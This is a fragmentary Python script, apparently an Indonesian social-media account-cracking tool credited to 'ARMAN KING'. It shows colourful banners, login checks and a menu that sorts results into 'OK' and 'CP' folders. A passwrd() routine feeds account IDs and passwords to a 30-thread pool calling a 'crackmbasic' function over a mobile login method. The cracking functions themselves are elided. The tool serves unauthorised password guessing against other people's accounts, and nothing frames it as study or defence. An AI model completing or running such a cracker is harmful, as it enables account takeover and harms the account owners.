...
def banner():
	print(f'''\t{asu}
\033[1;32m┌────────────────────────────────────────────────┐
\033[1;32m│\033[1;31m➣\033[1;37m AUTHOR  \033[1;31m:\033[1;32m ARMAN KING    
...
\033[1;32m└────────────────────────────────────────────────┘
{m}•{k}•{h}•{sir} RECOD : ARMAN KING {x}{m}•{k}•{h}•{x}''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
def login_lagi334():
	try:
		...
		print(f'├── {x}[{h}•{x}]{h} LOGIN BERARMAN  NJING JALANKAN ULANG PERINTAHNYA !{x} ');time.sleep(1)
		exit()
	except Exception as e:
...
#-----------------[ ARMAN -CRACK ]-----------------#
def result():
	print(f'├──[•] 1. ARMAN  {h}OK{x} ANDA ')
	print(f'├──[•] 2. ARMAN  {k}CP{x} ANDA ')
	print(f'├──[•] 3. KEMBALI	')
	kz = input(f'\n[•] SELECT : ')
	if kz in ['2']:
		try:vin = os.listdir('CP')
			...
			back()
		if len(vin)==0:
			print('├──[ANDA TIDAK MEMILIKI ARMAN  CP] ')
			time.sleep(2)
			back()
		else:
			cih = 0
...
def passwrd():
	...
	print('├')
	print(f'├──[OK]ARMAN  {h}OK{x} TERSIMPAN DI : {h}OK/%s {x}'%(okc))
	print(f'├──[CP]ARMAN  {k}CP{x} TERSIMPAN DI : {k}CP/%s {x}'%(cpc))
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crackmbasic,idf,pwv)
	print('')
	cetak(nel('\t[cyan]├──[green] COLY SUCCESFULLY ARMAN  NIKMATIN AJA[cyan] ├──[white] '))
